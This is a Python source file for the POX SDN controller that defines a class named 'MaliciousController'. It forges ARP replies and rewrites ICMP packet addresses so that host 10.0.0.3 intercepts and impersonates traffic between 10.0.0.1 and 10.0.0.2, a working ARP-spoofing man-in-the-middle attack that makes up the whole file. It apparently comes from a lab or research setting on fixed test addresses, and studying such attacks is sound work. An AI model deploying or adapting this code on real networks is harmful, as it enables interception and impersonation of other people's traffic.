from pox.core import core
import pox.openflow.libopenflow_01 as of
from pox.lib.packet.arp import arp
from pox.lib.packet.icmp import icmp
from pox.lib.packet.ipv4 import ipv4
from pox.lib.packet.ethernet import ethernet
import pox.lib.packet as pkt
from pox.lib.addresses import IPAddr,EthAddr

log = core.getLogger()

class MaliciousController (object):
  def __init__ (self, connection):
    self.connection = connection
    connection.addListeners(self)

  def resend_packet (self, packet_in, out_port):
    msg = of.ofp_packet_out()
    msg.data = packet_in

    # Add an action to send to the specified port
    action = of.ofp_action_output(port = out_port)
    msg.actions.append(action)

    # Send message to switch
    self.connection.send(msg)


  def _handle_PacketIn (self, event):
    """
    Handles packet in messages from the switch.
    """
    packet = event.parsed
    if not packet.parsed:
      log.warning("Ignoring incomplete packet")
      return
  
    packet_in = event.ofp
    if packet.type == packet.ARP_TYPE:
        if packet.payload.opcode == arp.REQUEST:
          if(packet.payload.protosrc == "10.0.0.1" and packet.payload.protodst == "10.0.0.2"):
            arp_reply = arp()
            arp_reply.hwsrc = EthAddr("00:00:00:00:00:03")
            arp_reply.hwdst = EthAddr("00:00:00:00:00:01")
            arp_reply.opcode = arp.REPLY
            arp_reply.protosrc = packet.payload.protodst
            arp_reply.protodst = packet.payload.protosrc
            ether = ethernet()
            ether.type = ethernet.ARP_TYPE
            ether.dst = packet.src
            ether.src = EthAddr("ff:ff:ff:ff:ff:ff")
            ether.payload = arp_reply
            self.resend_packet(ether, 1)
        if(packet.payload.protosrc == "10.0.0.3" and packet.payload.protodst == "10.0.0.1"):
            arp_reply = arp()
            arp_reply.hwsrc = EthAddr("00:00:00:00:00:01")
            arp_reply.hwdst = EthAddr("00:00:00:00:00:03")
            arp_reply.opcode = arp.REPLY
            arp_reply.protosrc = packet.payload.protodst
            arp_reply.protodst = packet.payload.protosrc
            ether = ethernet()
            ether.type = ethernet.ARP_TYPE
            ether.dst = packet.src
            ether.src = EthAddr("ff:ff:ff:ff:ff:ff")
            ether.payload = arp_reply
            self.resend_packet(ether, 3)
    
    if packet.type == packet.IP_TYPE:
      if(packet.payload.payload.type == 8):
        packet.payload.dstip = IPAddr("10.0.0.3")
        packet.src = EthAddr("00:00:00:00:00:01")
        packet.payload.srcip = IPAddr("10.0.0.1")
        self.resend_packet(packet, 3)
      if(packet.payload.payload.type == 0):
        packet.src = EthAddr("00:00:00:00:00:03")
        packet.payload.srcip = IPAddr("10.0.0.2")
        self.resend_packet(packet, 1)

def launch ():
  def start_switch (event):
    log.debug("Controlling %s" % (event.connection,))
    MaliciousController(event.connection)
  core.openflow.addListenerByName("ConnectionUp", start_switch)